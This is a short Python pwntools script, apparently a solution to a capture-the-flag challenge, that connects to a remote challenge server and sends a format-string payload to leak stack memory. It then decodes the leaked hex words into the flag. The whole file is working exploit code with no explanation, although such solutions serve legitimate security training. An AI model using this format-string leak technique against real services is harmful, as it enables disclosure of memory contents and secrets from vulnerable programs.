from pwn import *

r=remote("chals20.cybercastors.com",14426)

fmt='%7$lx '
pay=""
for i in range(7,13):
	fmt=fmt.replace(str(i),str(i+1))
	pay+=fmt

r.sendline(pay)
sleep(1)
ss=r.recvuntil(": ")
ss=r.recvline()
ss=ss.split()

flag=''

for i in range(len(ss)):
    temp=''
    for j in range(0,len(ss[i]),2):
        temp=chr(int(ss[i][j:j+2],16))+temp
    flag+=temp
print(flag)
